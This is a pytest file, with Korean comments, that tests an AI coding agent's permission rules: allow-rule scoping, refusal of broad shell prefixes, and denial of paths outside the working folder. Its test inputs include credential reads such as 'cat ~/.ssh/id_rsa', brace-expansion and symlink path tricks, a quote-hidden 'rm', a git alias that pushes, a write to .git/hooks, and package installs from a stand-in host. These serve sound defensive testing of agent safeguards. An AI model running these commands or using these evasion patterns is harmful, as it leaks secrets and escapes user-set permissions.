                "permissions": {"allow_rules": ["Edit(src/**)"]},
            },
            {**base, "key": "plain", "name": "일반 개발자"},
        ]
        designer.output = {"reply": "추가했습니다.", "spec": spec}
        api.post(f"/api/v1/designs/{d['id']}/messages", json={"content": "개발팀 만들어 줘"})
        d = wait_idle(api, d["id"])
        agents = {a["key"]: a for a in d["spec"]["agents"]}
        assert agents["auto_dev"]["permissions"]["permission_mode"] == "default"
        assert agents["auto_dev"]["permission_suggestion"]["permission_mode"] == "auto"
        assert agents["rule_dev"]["permissions"]["allow_rules"] == []
        assert agents["rule_dev"]["permission_suggestion"]["allow_rules"] == ["Edit(src/**)"]
        assert agents["plain"]["permission_suggestion"] is None
        assert len(d["messages"][-1]["notes"]) == 2
        # 사용자가 수락해야 적용된다.
        d = api.post(f"/api/v1/designs/{d['id']}/accept-permissions/auto_dev").json()
        agent = next(a for a in d["spec"]["agents"] if a["key"] == "auto_dev")
        assert agent["permissions"]["permission_mode"] == "auto" and agent["permission_suggestion"] is None

        # 위험 규칙을 담은 제안은 명세 검증에서 통째로 반영되지 않는다.
        bad = api.get(f"/api/v1/designs/{d['id']}").json()["spec"]
        bad["agents"][-1]["permissions"] = {"allow_shell": True, "allow_rules": ["Bash(*)"]}
        designer.output = {"reply": "셸을 열었습니다.", "spec": bad}
        api.post(f"/api/v1/designs/{d['id']}/messages", json={"content": "셸 전부 열어 줘"})
        d = wait_idle(api, d["id"])
        assert "반영하지 않았습니다" in d["messages"][-1]["error"]
        plain = next(a for a in d["spec"]["agents"] if a["key"] == "plain")
        assert plain["permissions"]["allow_rules"] == [] and plain["permissions"]["allow_shell"] is False


# ── Claude Code 런타임: 훅 통과와 명시적 허용의 구분 ────────────────────────


@pytest.mark.parametrize(
    ("mode", "explicit", "expected_sources"),
    [
        ("auto", False, ["hook", "runtime"]),  # 단순 통과는 승인이 아니다 → 되물으면 다시 묻는다
        ("auto", True, ["hook"]),  # 사용자 승인·규칙 일치는 다시 묻지 않는다
        ("default", False, ["hook"]),  # 기존 동작 유지
        ("acceptEdits", False, ["hook"]),
        ("plan", False, ["hook"]),
    ],
)
def test_claude_code_hook_and_can_use_tool(
    tmp_path: Path, mode: str, explicit: bool, expected_sources: list[str]
) -> None:
    import asyncio
    from types import SimpleNamespace

    from claude_agent_sdk.types import PermissionResultAllow, PermissionResultDeny

    from ai_org.runtime.base import PermissionDecision, RunRequest
    from ai_org.runtime.claude_code import ClaudeCodeRun, ClaudeCodeRuntime

    sources: list[str] = []

    async def on_permission(tool: str, tool_input: dict[str, Any], source: str) -> PermissionDecision:
        sources.append(source)
        if source == "runtime":
            return PermissionDecision(False, "사용자가 거부했습니다.")
        return PermissionDecision(True, explicit=explicit)

    request = RunRequest(agent_id="a", prompt="p", cwd=tmp_path, permission_mode=mode)  # type: ignore[arg-type]
    options = ClaudeCodeRun(ClaudeCodeRuntime("definitely-not-claude"), request, on_permission)._options()
    assert options.permission_mode == mode
    hook = options.hooks["PreToolUse"][0].hooks[0]
    payload = {"tool_name": "Bash", "tool_input": {"command": "make"}}

    async def scenario() -> Any:
        out = await hook(payload, "tool-1", None)
        # 훅은 통과시킬 뿐 permissionDecision "allow"를 돌려주지 않는다(Claude Code 확인을 건너뛰지 않음).
        assert "hookSpecificOutput" not in out
        return await options.can_use_tool("Bash", {"command": "make"}, SimpleNamespace(tool_use_id="tool-1"))

    result = asyncio.run(scenario())
    assert sources == expected_sources
    expected = PermissionResultDeny if "runtime" in expected_sources else PermissionResultAllow
    assert isinstance(result, expected)


# ── '항상 허용' 규칙 생성 범위 ──────────────────────────────────────────────


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("git status", "Bash(git status:*)"),
        ("git status -s", "Bash(git status:*)"),
        ("git", "Bash(git)"),
        ("git diff HEAD~1", "Bash(git diff:*)"),
        ("git config user.name x", "Bash(git config user.name x)"),
        ("find . -name x", "Bash(find . -name x)"),
        ("cat README.md", "Bash(cat README.md)"),
        ("curl -s http://x.example/a", "Bash(curl -s http://x.example/a)"),
        ("ls", "Bash(ls)"),
        ("ls -la src", "Bash(ls -la src)"),
        ("npm test", "Bash(npm test:*)"),
        ("npm run test -- -q", "Bash(npm run test:*)"),
        ("npm run test:unit", "Bash(npm run test:unit:*)"),
        ("pnpm run build", "Bash(pnpm run build:*)"),
        ("npm run", "Bash(npm run)"),
        ("make build", "Bash(make build:*)"),
        ("make", "Bash(make)"),
        ("cargo test --all", "Bash(cargo test:*)"),
        ("uv run pytest -q", "Bash(uv run pytest -q)"),
        ("docker exec app ls", "Bash(docker exec app ls)"),
        ("npm exec eslint .", "Bash(npm exec eslint .)"),
        ("python script.py", "Bash(python script.py)"),
        ("python3.12  -m  pytest", "Bash(python3.12 -m pytest)"),
        ("/usr/bin/node build.js", "Bash(/usr/bin/node build.js)"),
        ("ls -la", "Bash(ls -la)"),
        ("pytest -q", "Bash(pytest -q)"),
    ],
)
def test_suggest_shell_rule_scope(root: list[Path], command: str, expected: str) -> None:
    assert rules.suggest("Bash", {"command": command}, root, group="shell") == (expected, "")


def test_suggest_shell_rule_refusals(root: list[Path]) -> None:
    for command in ("git push origin main", "python -c 'print(1)' " + "x" * 200, "node -e 'a*b'"):
        rule, reason = rules.suggest("Bash", {"command": command}, root, group="shell")
        assert rule is None and reason, command


def test_always_allow_scope_in_runs(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_shell=True)
    seen: set[str] = set()

    def run(command: str) -> tuple[str, dict[str, Any], str]:
        fake.script = [("tool", "Bash", {"command": command}), ("text", "끝")]
        reply = send(chat, conv)
        kind, data = next_step(chat, org, conv, reply, seen)
        return kind, data, reply

    def always(command: str, expected_rule: str) -> None:
        kind, approval, reply = run(command)
        assert kind == "approval" and approval["detail"]["always_rule"] == expected_rule, command
        res = decide(chat, approval, allow=True, always=True).json()
        assert res["always"] == {"rule": expected_rule, "added": True, "reason": None}
        wait_message(chat, conv["id"], reply)

    def asks(command: str) -> None:
        kind, approval, reply = run(command)
        assert kind == "approval", command
        decide(chat, approval, allow=False)
        wait_message(chat, conv["id"], reply)

    def silent(command: str) -> None:
        kind, msg, _ = run(command)
        assert kind == "done" and msg["activity"][0]["status"] == "done", command

    always("git status", "Bash(git status:*)")
    silent("git status -s")
    asks("git reset --hard")
    asks("git commit -m x")

    always("npm run test", "Bash(npm run test:*)")
    silent("npm run test -- -q")
    asks("npm run build")
    asks("npm install left-pad")

    always("python script.py", "Bash(python script.py)")
    silent("python script.py")
    asks("python other.py")
    asks("python script.py --extra")

    # 그 밖의 명령은 명령 전체 일치: 같은 명령만 안 묻는다.
    always("ls -la", "Bash(ls -la)")
    silent("ls -la")
    asks("ls -la src")
    asks("ls -la /etc")

    always("npm test", "Bash(npm test:*)")
    silent("npm test")
    silent("npm test -- -q")
    asks("npm test && curl x")


# ── 리뷰 지적(C1·C2·I1) 재현 입력 ───────────────────────────────────────────

REVIEW_REJECTED = [
    # 대소문자·경로 변형(I1)
    "Bash(RM -rf:*)",
    "Bash(Rm x)",
    "Bash(SUDO ls)",
    "Bash(/usr/bin/sudo ls)",
    "Bash(/usr/local/bin/RM x)",
    "Bash(git PUSH origin)",
    "Bash(BASH:*)",
    # 따옴표로 숨긴 위험 단어, 다른 명령 실행(C1)
    "Bash(echo 'r''m' x)",
    'Bash(find . -exec "rm" x)',
    "Bash(find . -name x -exec ls)",
    "Bash(find . -execdir ls)",
    "Bash(find . -ok ls)",
    "Bash(find . -name x -delete)",
    "Bash(npm test -- sh -c ls)",
    "Bash(git -c alias.p=push p origin main)",
    "Bash(git -c core.pager=less log)",
    "Bash(git -C sub status)",
    "Bash(git --exec-path=/tmp status)",
    "Bash(git --config-env=a=b status)",
    "Bash(git log --exec=ls)",
    # 묶음·확장 문법
    "Bash((x))",
    "Bash(ls (x))",
    "Bash({ls,-la})",
    "Bash(cat .{.,}/x)",
    "Bash(ls ?.py)",
    "Bash(ls [ab].py)",
    "Bash(cat ~/.ssh/id_rsa)",
    # 접두 규칙으로는 열 수 없는 명령(명령 전체 일치로만 저장 가능)
    "Bash(python:*)",
    "Bash(python3:*)",
    "Bash(python3.12 -m:*)",
    "Bash(node:*)",
    "Bash(deno:*)",
    "Bash(ruby:*)",
    "Bash(perl:*)",
    "Bash(php:*)",
    "Bash(find:*)",
    "Bash(find . -name:*)",
    "Bash(sed:*)",
    "Bash(awk:*)",
    "Bash(gawk:*)",
    "Bash(tar:*)",
    "Bash(ssh:*)",
    "Bash(parallel:*)",
    "Bash(tee:*)",
    "Bash(dd:*)",
    "Bash(mv:*)",
    "Bash(git:*)",
    "Bash(npm:*)",
    "Bash(npx:*)",
    "Bash(docker:*)",
    "Bash(make:*)",
    "Bash(uv:*)",
    "Bash(git config:*)",
    "Bash(git rebase:*)",
    "Bash(uv run:*)",
    "Bash(npm exec:*)",
    "Bash(npm run:*)",
    "Bash(docker run:*)",
    "Bash(docker exec:*)",
    "Bash(pnpm dlx:*)",
    "Bash(cargo run:*)",
]
# 접두로는 거부되는 명령도 명령 전체 일치로는 저장할 수 있고, 안전한 접두 규칙은 그대로 저장된다.
STORABLE = [
    "Bash(python3 script.py)",
    "Bash(node build.js)",
    "Bash(find . -name x)",
    "Bash(sed -n 1p a.txt)",
    "Bash(git)",
    "Bash(make)",
    "Bash(uv run pytest -q)",
    "Bash(docker run app)",
    "Bash(git diff HEAD~1)",
    "Bash(git status:*)",
    "Bash(npm test:*)",
    "Bash(npm run test:*)",
    "Bash(pnpm run build:*)",
    "Bash(make build:*)",
    "Bash(cargo test:*)",
    "Bash(npx eslint:*)",
    "Bash(ls:*)",
    "Bash(cat:*)",
    "Bash(pytest:*)",
]


@pytest.mark.parametrize("rule", REVIEW_REJECTED)
def test_review_rules_are_rejected(rule: str) -> None:
    with pytest.raises(rules.RuleError):
        rules.parse(rule)
    with pytest.raises(ValidationError):
        AgentPermissions(allow_rules=[rule])


@pytest.mark.parametrize("rule", STORABLE)
def test_storable_shell_rules(rule: str) -> None:
    assert AgentPermissions(allow_rules=[rule]).allow_rules == [rule]


def test_prefix_rejection_message_points_to_exact_rule() -> None:
    for rule in ("Bash(python3:*)", "Bash(find:*)", "Bash(git:*)", "Bash(uv run:*)"):
        with pytest.raises(rules.RuleError, match="명령 전체"):
            rules.parse(rule)


@pytest.mark.parametrize(
    "command",
    [
        "cat .{.,}/.{.,}/.ssh/id_rsa",  # 중괄호 확장 → ../../.ssh/id_rsa
        "cat {/etc/passwd,x}",
        "cat .?/.?/x",
        "cat .*/x",
        "cat ../x",
        "cat ~/.ssh/id_rsa",
        "cat link/secret",  # 폴더 안 심볼릭 링크가 밖을 가리킨다
        "cat link",
        "cat src/../link/secret",
    ],
)
def test_shell_outside_paths_ask_before_rules(root: list[Path], tmp_path: Path, command: str) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret").write_text("x")
    (root[0] / "link").symlink_to(outside)
    for mode in ("default", "auto"):
        perms = shell_perms(permission_mode=mode, require_approval=[], allow_rules=["Bash(cat:*)"])
        verdict = policy.decide(perms, "Bash", {"command": command}, root)
        assert verdict.action == "ask" and verdict.outside is True, (mode, command)
        assert rules.suggest("Bash", {"command": command}, root, group="shell", outside=True)[0] is None


def test_shell_inside_relative_paths_still_match(root: list[Path]) -> None:
    (root[0] / "src" / "a.txt").write_text("x")
    perms = shell_perms(allow_rules=["Bash(cat:*)"])
    for command in ("cat src/a.txt", "cat src/missing.txt", "cat a.txt"):
        verdict = policy.decide(perms, "Bash", {"command": command}, root)
        assert verdict.action == "allow" and verdict.explicit is True, command


@pytest.mark.parametrize(
    ("tool", "tool_input"),
    [
        ("Glob", {"pattern": "/home/x/.ssh/*"}),
        ("Glob", {"pattern": "/etc/**"}),
        ("Glob", {"pattern": "../*"}),
        ("Glob", {"pattern": "src/../../*"}),
        ("Glob", {"pattern": "*/../../x"}),
        ("Glob", {"pattern": "~/.ssh/*"}),
        ("Glob", {"pattern": ".{.,}/*"}),
        ("Glob", {"pattern": "{/etc/passwd,x}"}),
        ("Glob", {"pattern": "link/*"}),
        ("Glob", {"pattern": "*.py", "path": "/etc"}),
        ("Glob", {"pattern": "*.py", "path": "link"}),
        ("Grep", {"pattern": "key", "glob": "/home/x/**"}),
        ("Grep", {"pattern": "key", "glob": "../**/*.pem"}),
        ("Grep", {"pattern": "key", "glob": "~/**"}),
        ("Grep", {"pattern": "key", "path": "/etc"}),
        ("Grep", {"pattern": "key", "path": "../other"}),
        ("Grep", {"pattern": "key", "path": "~/.ssh"}),
    ],
)
def test_file_tool_path_arguments_outside_are_denied(
    root: list[Path], tmp_path: Path, tool: str, tool_input: dict[str, Any]
) -> None:
    outside = tmp_path / "outside"
    outside.mkdir()
    (root[0] / "link").symlink_to(outside)
    for mode in ("default", "auto"):
        perms = AgentPermissions(permission_mode=mode, allow_rules=["Read(**)"])
        for source in ("hook", "runtime"):
            verdict = policy.decide(perms, tool, tool_input, root, source=source)  # type: ignore[arg-type]
            assert verdict.action == "deny" and verdict.outside is True, (mode, source)
    assert rules.match(["Read(**)"], tool, tool_input, root) is None
    assert rules.suggest(tool, tool_input, root)[0] is None


def test_file_tool_inside_patterns_are_not_denied(root: list[Path]) -> None:
    perms = AgentPermissions(allow_rules=["Read(**)"])
    for tool, tool_input in (
        ("Glob", {"pattern": "src/**/*.py"}),
        ("Glob", {"pattern": "**/*.{ts,tsx}"}),
        ("Glob", {"pattern": "*.py", "path": "src"}),
        ("Grep", {"pattern": "/api/v1/.*", "glob": "*.py"}),  # Grep의 pattern은 정규식이다
        ("Grep", {"pattern": "\\.\\./", "path": "src"}),
    ):
        verdict = policy.decide(perms, tool, tool_input, root)
        assert verdict.action == "allow" and verdict.explicit is True, (tool, tool_input)


def test_pathless_search_never_becomes_a_rule(root: list[Path]) -> None:
    for tool, tool_input in (
        ("Grep", {"pattern": "TODO"}),
        ("Glob", {"pattern": "**/*.py"}),
        ("Grep", {"pattern": "TODO", "path": "."}),
        ("Glob", {"pattern": "*", "path": str(root[0])}),
    ):
        rule, reason = rules.suggest(tool, tool_input, root)
        assert rule is None and "작업 폴더 전체" in reason, (tool, tool_input)
    assert rules.suggest("Grep", {"pattern": "TODO", "path": "src"}, root)[0] == "Read(src)"
    # 사람이 직접 저장하는 전체 글롭은 기존대로 가능하다.
    assert AgentPermissions(allow_rules=["Read(**)", "Edit(**)"]).allow_rules == ["Read(**)", "Edit(**)"]


def test_corrupt_stored_rules_are_dropped_but_run_continues(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    with chat.app.state.runs.factory() as db:  # type: ignore[attr-defined]
        agent = db.get(Agent, ceo["id"])
        agent.permissions = {
            "allow_shell": True,
            "allow_network": False,
            "require_approval": ["shell"],
            "allow_rules": ["Bash(git:*)", "Bash(*)", "Bash(RM:*)", 7, "Bash(npm test:*)"],
        }
        db.commit()
    # 조회도 깨지지 않고, 통과하는 규칙만 보인다. 다른 권한은 저장된 그대로다(느슨해지지 않는다).
    perms = chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]
    assert perms["allow_rules"] == ["Bash(npm test:*)"]
    assert perms["allow_network"] is False and perms["require_approval"] == ["shell"]
    assert chat.get(f"/api/v1/organizations/{org['id']}").status_code == 200

    seen: set[str] = set()
    fake.script = [("tool", "Bash", {"command": "npm test"}), ("tool", "WebSearch", {"query": "x"})]
    kind, msg = next_step(chat, org, conv, send(chat, conv), seen)
    assert kind == "done" and [a["status"] for a in msg["activity"]] == ["done", "failed"]
    # 버려진 넓은 규칙(`Bash(git:*)`)은 적용되지 않는다 → 묻는다.
    fake.script = [("tool", "Bash", {"command": "git log"}), ("text", "끝")]
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["always_rule"] == "Bash(git log:*)"
    assert decide(chat, approval, allow=True, always=True).json()["always"]["added"] is True
    assert wait_message(chat, conv["id"], reply)["status"] == "done"
    stored = chat.get(f"/api/v1/agents/{ceo['id']}").json()["permissions"]
    assert stored["allow_rules"] == ["Bash(npm test:*)", "Bash(git log:*)"]
    assert stored["allow_network"] is False


def test_marker_runtime_rules_expected_by_frontend(settings: Settings) -> None:
    runtime = MarkerRuntime()
    with TestClient(
        create_app(settings, runtime_for=lambda _id: runtime), base_url="http://127.0.0.1:8000"
    ) as client:
        org, conv = setup_org(client)
        ceo = lead_of(org)
        patch_perms(client, org, ceo, allow_shell=True)
        seen: set[str] = set()
        for content, expected in (
            ("[승인]", "Edit(e2e.txt)"),
            ("[셸:npm test]", "Bash(npm test:*)"),
            ("[셸:git status]", "Bash(git status:*)"),
        ):
            reply = send(client, conv, content)
            kind, approval = next_step(client, org, conv, reply, seen)
            assert kind == "approval" and approval["detail"]["always_rule"] == expected, content
            assert decide(client, approval, allow=False).status_code == 200
            wait_message(client, conv["id"], reply)


# ── 재검증 지적 N1: 패키지 실행기·설치류 접두, git --output ──────────────────


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("npx tsx a.ts", "Bash(npx tsx a.ts)"),
        ("npx vitest run", "Bash(npx vitest run)"),
        ("bunx tsx a.ts", "Bash(bunx tsx a.ts)"),
        ("pipx run black .", "Bash(pipx run black .)"),
        ("pnpm dlx tsx a.ts", "Bash(pnpm dlx tsx a.ts)"),
        ("npm install lodash", "Bash(npm install lodash)"),
        ("npm i lodash", "Bash(npm i lodash)"),
        ("npm ci", "Bash(npm ci)"),
        ("pnpm add lodash", "Bash(pnpm add lodash)"),
        ("yarn add lodash", "Bash(yarn add lodash)"),
        ("bun add lodash", "Bash(bun add lodash)"),
        ("pip install requests", "Bash(pip install requests)"),
        ("pip3 install -r requirements.txt", "Bash(pip3 install -r requirements.txt)"),
        ("uv pip install requests", "Bash(uv pip install requests)"),
        ("uv add requests", "Bash(uv add requests)"),
        ("poetry add requests", "Bash(poetry add requests)"),
        ("cargo install ripgrep", "Bash(cargo install ripgrep)"),
        ("go install example.com/x@latest", "Bash(go install example.com/x@latest)"),
        ("go get example.com/x", "Bash(go get example.com/x)"),
        ("brew install jq", "Bash(brew install jq)"),
        ("apt-get install jq", "Bash(apt-get install jq)"),
        ("npm update", "Bash(npm update)"),
        ("npm uninstall lodash", "Bash(npm uninstall lodash)"),
        ("npm publish", "Bash(npm publish)"),
        ("npm link", "Bash(npm link)"),
        # 프론트 E2E가 가정하는 값은 그대로다.
        ("npm test", "Bash(npm test:*)"),
        ("git status", "Bash(git status:*)"),
        ("npm run build", "Bash(npm run build:*)"),
    ],
)
def test_suggest_package_commands_are_exact(root: list[Path], command: str, expected: str) -> None:
    assert rules.suggest("Bash", {"command": command}, root, group="shell") == (expected, "")


@pytest.mark.parametrize(
    "rule",
    [
        "Bash(npx node:*)",
        "Bash(npx tsx:*)",
        "Bash(npx ts-node:*)",
        "Bash(npx tsx@latest:*)",
        "Bash(npx @scope/tsx:*)",
        "Bash(npx python3:*)",
        "Bash(npx sh:*)",
        "Bash(npx -y tsx:*)",
        "Bash(bunx tsx:*)",
        "Bash(bunx node:*)",
        "Bash(pipx run:*)",
        "Bash(pipx python:*)",
        "Bash(npm install:*)",
        "Bash(npm i:*)",
        "Bash(npm ci:*)",
        "Bash(npm update:*)",
        "Bash(npm uninstall:*)",
        "Bash(npm publish:*)",
        "Bash(npm link:*)",
        "Bash(pnpm add:*)",
        "Bash(yarn add:*)",
        "Bash(bun add:*)",
        "Bash(pip install:*)",
        "Bash(pip3 install:*)",
        "Bash(uv pip:*)",
        "Bash(uv add:*)",
        "Bash(poetry add:*)",
        "Bash(cargo install:*)",
        "Bash(go install:*)",
        "Bash(go get:*)",
        "Bash(gem install:*)",
        "Bash(brew install:*)",
        "Bash(apt install:*)",
        "Bash(apt-get install:*)",
        "Bash(git diff --output=x)",
        "Bash(git diff --output x)",
    ],
)
def test_n1_rules_are_rejected(rule: str) -> None:
    with pytest.raises(rules.RuleError):
        rules.parse(rule)
    with pytest.raises(ValidationError):
        AgentPermissions(allow_rules=[rule])


@pytest.mark.parametrize(
    "rule",
    [
        "Bash(npx vitest:*)",
        "Bash(npx eslint:*)",
        "Bash(bunx prettier:*)",
        "Bash(npx tsx a.ts)",
        "Bash(npm install lodash)",
        "Bash(pip install requests)",
        "Bash(npm ls:*)",
        "Bash(pip list:*)",
        "Bash(cargo test:*)",
        "Bash(go test:*)",
        "Bash(git diff:*)",
    ],
)
def test_n1_rules_still_storable(rule: str) -> None:
    assert AgentPermissions(allow_rules=[rule]).allow_rules == [rule]


@pytest.mark.parametrize(
    ("always", "expected_rule", "later"),
    [
        ("npx tsx a.ts", "Bash(npx tsx a.ts)", "npx tsx evil.ts"),
        ("npm install lodash", "Bash(npm install lodash)", "npm install https://x.example/y.tgz"),
        ("pip install requests", "Bash(pip install requests)", "pip install https://x.example/y.tar.gz"),
    ],
)
def test_n1_always_allow_does_not_open_other_packages(
    chat: TestClient, fake: FakeRuntime, always: str, expected_rule: str, later: str
) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_shell=True)
    seen: set[str] = set()
    fake.script = [("tool", "Bash", {"command": always}), ("tool", "Bash", {"command": always})]
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["always_rule"] == expected_rule
    assert decide(chat, approval, allow=True, always=True).json()["always"]["added"] is True
    kind, msg = next_step(chat, org, conv, reply, seen)  # 같은 명령은 다시 묻지 않는다
    assert kind == "done" and [a["status"] for a in msg["activity"]] == ["done", "done"]
    fake.script = [("tool", "Bash", {"command": later}), ("text", "끝")]
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)  # 다른 대상은 묻는다
    assert kind == "approval", later
    decide(chat, approval, allow=False)
    wait_message(chat, conv["id"], reply)


@pytest.mark.parametrize(
    "command",
    [
        "git diff --output=x",
        "git diff --output x",
        "git diff --output=.git/hooks/pre-commit",
        "git log --output=x",
        "npx tsx evil.ts",
        "npm install https://x.example/y.tgz",
    ],
)
def test_n1_matching_rejects(root: list[Path], command: str) -> None:
    # 옛 값으로 넓은 접두 규칙이 남아 있어도(검증에서 버려진다) 맞지 않는다.
    perms = shell_perms(allow_rules=["Bash(git diff:*)", "Bash(git log:*)"])
    stale = perms.model_copy(
        update={"allow_rules": [*perms.allow_rules, "Bash(npx tsx:*)", "Bash(npm install:*)"]}
    )
    verdict = policy.decide(stale, "Bash", {"command": command}, root)
    assert verdict.action == "ask" and verdict.explicit is False
    assert policy.decide(perms, "Bash", {"command": "git diff --stat"}, root).explicit is True


# ── develop 병합 뒤 상호작용: 대화 기본 프로젝트(#63)·작업 중 대기열(#45) ───────


def test_default_project_conversation_keeps_outside_judgement(
    chat: TestClient, fake: FakeRuntime, tmp_path: Path, settings: Settings
) -> None:
    org = chat.post("/api/v1/organizations/from-template", json={"template_key": "software"}).json()
    code = tmp_path / "code"
    (code / "one").mkdir(parents=True)
    (code / "one" / "package.json").write_text("{}")
    (code / "other").mkdir()
    chat.post("/api/v1/project-roots", json={"path": str(code)})
    project = chat.post(
        "/api/v1/projects", json={"path": str(code / "one"), "organization_id": org["id"]}
    ).json()
    conv = chat.post("/api/v1/conversations", json={"organization_id": org["id"]}).json()
    assert conv["project_id"] == project["id"]  # 연결된 프로젝트가 하나면 그 폴더가 작업 폴더다
    ceo = lead_of(org)
    res = patch_perms(
        chat,
        org,
        ceo,
        permission_mode="auto",
        allow_shell=True,
        allow_rules=["Read(**)", "Edit(**)", "Bash(cat:*)"],
    )
    assert res.status_code == 200
    workspace = settings.home / "workspaces" / org["id"] / ceo["id"]
    fake.script = [
        ("tool", "Read", {"file_path": "package.json"}),  # 프로젝트 안: 규칙 일치
        ("tool", "Read", {"file_path": str(code / "other" / "x")}),  # 옆 폴더: 거부
        ("tool", "Write", {"file_path": str(workspace / "x.txt")}),  # 전용 폴더도 이 대화에서는 밖이다
        ("ask", "Glob", {"pattern": str(code / "*")}),
        ("tool", "Bash", {"command": "cat ../other/x"}),  # 셸은 승인
    ]
    seen: set[str] = set()
    reply = send(chat, conv)
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval" and approval["detail"]["tool"] == "Bash"
    assert "작업 폴더 밖" in approval["detail"]["reason"] and approval["detail"]["always_rule"] is None
    decide(chat, approval, allow=False)
    msg = wait_message(chat, conv["id"], reply)
    assert [a["status"] for a in msg["activity"]] == ["done", "failed", "failed", "failed", "failed"]
    assert fake.requests[-1].cwd == Path(project["path"])


def test_queued_message_run_uses_rule_added_while_waiting(chat: TestClient, fake: FakeRuntime) -> None:
    org, conv = setup_org(chat)
    ceo = lead_of(org)
    patch_perms(chat, org, ceo, allow_shell=True)
    fake.queues[ceo["id"]] = [
        [("tool", "Bash", {"command": "npm test"}), ("text", "첫 실행 끝")],
        [("tool", "Bash", {"command": "npm test -- -q"}), ("text", "대기 메시지 실행 끝")],
    ]
    seen: set[str] = set()
    reply = send(chat, conv, "테스트 돌려")
    kind, approval = next_step(chat, org, conv, reply, seen)
    assert kind == "approval"
    # 승인을 기다리는 동안 보낸 메시지는 대기열에 들어간다.
    queued = chat.post(f"/api/v1/conversations/{conv['id']}/messages", json={"content": "한 번 더"}).json()
    assert queued["assistant_message_ids"] == [] and queued["queued_agent_ids"] == [ceo["id"]]
    res = decide(chat, approval, allow=True, always=True).json()
    assert res["always"] == {"rule": "Bash(npm test:*)", "added": True, "reason": None}
    wait_message(chat, conv["id"], reply)
    deadline = time.time() + 5
    replies: list[dict[str, Any]] = []
    while time.time() < deadline:
        detail = chat.get(f"/api/v1/conversations/{conv['id']}").json()
        replies = [m for m in detail["messages"] if m["role"] == "assistant"]
        if len(replies) == 2 and replies[1]["status"] not in ("pending", "streaming"):
            break
        time.sleep(0.05)
    # 이어서 실행된 대기 메시지는 방금 추가된 규칙으로 묻지 않고 끝난다.
    assert len(replies) == 2 and replies[1]["status"] == "done"
    assert replies[1]["activity"][0]["status"] == "done"
    assert chat.get("/api/v1/approvals", params={"organization_id": org["id"]}).json() == []
